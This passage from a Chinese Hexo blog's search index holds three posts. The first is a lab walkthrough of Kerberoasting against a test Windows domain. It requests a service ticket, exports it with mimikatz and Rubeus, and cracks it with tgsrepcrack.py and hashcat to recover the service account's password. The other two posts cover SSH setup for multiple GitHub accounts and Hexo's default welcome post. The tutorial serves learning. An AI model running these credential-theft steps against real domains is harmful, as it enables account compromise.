href="https://github.com/hashcat/hashcat">Hashcat</a></h3><p>hashcat工具的简介与使用可以参考：<a href="https://goyasha.com/post/ZKgJ5d4Q/">本文</a></p><hr><p>工具的简介与使用互联网解释的比我好，上面工具罗列了他们的github地址，请参考</p><h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><p>域控：Windows service 2016</p><p>​同时安装SQL Server 2008 R2 </p><p>​同时创建用户mssql，密码sky@1321</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">setspn -A MSSQLSvc/demo<span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.com</span>:<span class="hljs-number">1443</span> mssql<br></code></pre></td></tr></tbody></table></figure><p>注册一条服务类为MSSQLSvc，主机为demo.test.com，端口为1433，注册在mssql域用户下</p><figure class="highlight asciidoc"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">setspn -q <span class="hljs-strong">*/*</span><br></code></pre></td></tr></tbody></table></figure><p>查看当前所有域</p><figure class="highlight pgsql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Add</span>-<span class="hljs-keyword">Type</span> -AssemblyName <span class="hljs-keyword">System</span>.IdentityModel<br><span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> <span class="hljs-keyword">System</span>.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/demo.test.com:1443"<br></code></pre></td></tr></tbody></table></figure><p>请求SPNKerberos票据——单个服务</p><p><img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529125706148.png" alt="image-20230529125706148"></p><figure class="highlight ebnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">klist</span><br></code></pre></td></tr></tbody></table></figure><p>查看缓存中的所有票据</p><p><img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529125851635.png" alt="image-20230529125851635"></p><p>使用Rubeus和mimikatz都可以导出票据</p><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">kerberos::list /<span class="hljs-keyword">export</span><span class="hljs-comment">//mimikatz执行</span><br>Rubeus.exe kerberoast /outfile:hash.txt<br></code></pre></td></tr></tbody></table></figure><p>mimikatz:kerberos::list /export</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2.<span class="hljs-number">7</span> tgsrepcrack<span class="hljs-selector-class">.py</span> zidian<span class="hljs-selector-class">.txt</span> ex.kirbi<br></code></pre></td></tr></tbody></table></figure><p>在kali安装kerberoast，使用kerberoast的tgsrepcrack.py离线破解票据ex.kirbi</p><p>rubeus:<img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529130759981.png" alt="image-20230529130759981"></p><p>因为hashcat的运行模式，在虚拟机破解报错，我们在真机运行以下命令，尝试破解</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hashcat<span class="hljs-selector-class">.exe</span> -m <span class="hljs-number">13100</span> hash<span class="hljs-selector-class">.txt</span> ziidian.txt<br></code></pre></td></tr></tbody></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529131206163.png" alt="image-20230529131206163"></p><p>成功，可以看到密码sky@1321</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>注册主机名要和后面请求票据时保持一致。</p><p>demo是主机名，test.com是域控网址。</p><p>zidian.txt是包含密码的字典，可能不包含你设置账户的密码，可以自行添加</p><p>-m 13100是破解的散列值类型，可以这篇<a href="https://goyasha.com/post/ZKgJ5d4Q/">文章</a>选择</p>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>一台电脑SSH连接多个github账户的配置细节</title>
    <link href="/posts/155c2f89/"/>
    <url>/posts/155c2f89/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>作者在已经使用默认私钥连接某个github账户后，现在需要在另一个github账户上搭建Hexo博客，那么就需要配置两个私钥，下面就是配置过程的一些细节。</p><h3 id="配置SSH密钥："><a href="#配置SSH密钥：" class="headerlink" title="配置SSH密钥："></a>配置SSH密钥：</h3><p>只有配置好 SSH 密钥后，我们才可以通过 git 操作实现本地代码库与 Github 代码库同步，在你第一次新建的文件夹里面（如：我的文件夹为：F:\Hnkey\Blog），右键Git Bash Here 输入以下命令：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ ssh-keygen -t rsa -C <span class="hljs-string">"your email@example.com"</span> <br><span class="hljs-regexp">//</span>引号里面填写你的邮箱地址，比如abcdefg@qq.com<br></code></pre></td></tr></tbody></table></figure><p>然后会出现以下信息：</p><figure class="highlight gradle"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">Generating <span class="hljs-keyword">public</span>/<span class="hljs-keyword">private</span> rsa key pair.  <br>Enter <span class="hljs-keyword">file</span> in which to save the key (<span class="hljs-regexp">/c/U</span>sers<span class="hljs-regexp">/you/</span>.ssh/id_rsa):  <br></code></pre></td></tr></tbody></table></figure><p>不要以默认方式存储密钥，这样会覆盖我们以前的密钥：</p><p>选择一个合适的密钥名字，如：id_rsa_hnkey,然后就可以一直回车了，现在我们到C盘的.SSH文件里查看，就会有我们原来默认的私钥和新创建的私钥文件,文件列表如下：</p><figure class="highlight autohotkey"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">id_rsa<br>id_rsa.pub<br>id_rs<span class="hljs-built_in">a_hnkey</span><br>id_rs<span class="hljs-built_in">a_hnkey</span>.pub<br></code></pre></td></tr></tbody></table></figure><p>我们现在需要在该目录(我的.ssh目录：C:\Users\book.ssh)下新创建一个配置文件，文件名为config,没有后缀名，config文件编辑以下内容：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 加上以下内容</span><br><span class="hljs-comment">#default github</span><br>Host github.com<br>HostName github.com<br>PreferredAuthentications publickey<br>IdentityFile ~<span class="hljs-regexp">/.ssh/i</span>d_rsa<br> <br>Host hnkey.github.com<span class="hljs-comment">#取一个区别与默认Host(github.com)的别名，任意取，建议别名方便记忆</span><br>HostName github.com<span class="hljs-comment">#不要改这行</span><br>PreferredAuthentications publickey<br>IdentityFile ~<span class="hljs-regexp">/.ssh/i</span>d_rsa_hnkey<span class="hljs-comment">#私钥文件名</span><br>user hnkey<span class="hljs-comment">#指明是谁在使用改私钥</span><br></code></pre></td></tr></tbody></table></figure><p>由于第一个私钥是默认的，如果你也有一个默认的私钥，那么可以不做修改，主要需要对第二个私钥进行配置，细节在上文已经注释</p><p>修改完成后，测试一下链接是否成功建立</p><figure class="highlight nginx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> -T git<span class="hljs-variable">@hnkey</span>.github.com<br></code></pre></td></tr></tbody></table></figure><p>区别于默认的测试命令</p><p>如果出现错误： Permission denied (publickey).</p><p>那么执行一下以下命令：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">ssh-agent -s<br>ssh-add ~<span class="hljs-regexp">/.ssh/i</span>d_rsa_hnkey<span class="hljs-comment">#私钥文件名需要修改</span><br></code></pre></td></tr></tbody></table></figure><p>再执行测试命令，一般都不会出错，会出现以下提示：</p><figure class="highlight 1c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Hi,xxxxx, You<span class="hljs-string">"ve successfully......</span><br></code></pre></td></tr></tbody></table></figure><p>说明同一设备连接多github账户已经成功</p><h3 id="配置GIT个人信息"><a href="#配置GIT个人信息" class="headerlink" title="配置GIT个人信息"></a>配置GIT个人信息</h3><p>如果你在曾经连接GitHub仓库已经配置了全局的个人信息，不用清除，因为我得到的答案是局部配置会优于全局配置生效，那么，我们只需要在该仓库下配置局部的个人信息，就可以了。</p><p>为确保这是一个合格的git仓库，请在该仓库的起始目录初始化：</p><figure class="highlight csharp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">git <span class="hljs-keyword">init</span><br></code></pre></td></tr></tbody></table></figure><p>然后执行以下命令，配置局部的git个人信息：</p><figure class="highlight pgsql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">git config <span class="hljs-keyword">user</span>.name "your.name"#需要配置的用户名和邮箱，这里的your.name,就输入前面config文件中的<span class="hljs-keyword">user</span>用户<br>git config <span class="hljs-keyword">user</span>.email "your.email"<br></code></pre></td></tr></tbody></table></figure><p>以后，我们在该仓库下执行克隆等命令，都需要使用别名</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">git clone git@hnkey<span class="hljs-selector-class">.github</span><span class="hljs-selector-class">.com</span>:Hooahhh/hexo-theme-fluid<span class="hljs-selector-class">.git</span><br>官网给你的SSH连接地址是：github<span class="hljs-selector-class">.com</span>:Hooahhh/hexo-theme-fluid.git，需要手动修改<br></code></pre></td></tr></tbody></table></figure><h3 id="配置配置文件"><a href="#配置配置文件" class="headerlink" title="配置配置文件"></a>配置配置文件</h3><p>这一步是配置Hexo的配置文件的内容，与上文已无关系，在此做个记录。</p><p>Hexo文件下的_config.yml文件就是Hexo主要的配置文件，要想将内容配置到对应的仓库，配置文件修改如下：</p><figure class="highlight dts"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">deploy:</span><br><span class="hljs-symbol">  type:</span> git<br><span class="hljs-symbol">  repository:</span> git@hnkey.github.com:Hnkey/hnkey.github.io.git<br><span class="hljs-symbol">  branch:</span> master<br>  <span class="hljs-meta">#需要注意的是，比如type: git之间有个空格</span><br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>计算机和网络技能</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/posts/4a17b156/"/>
    <url>/posts/4a17b156/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">"My New Post"</span><br></code></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    <categories>
      
      <category>计算机和网络技能</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
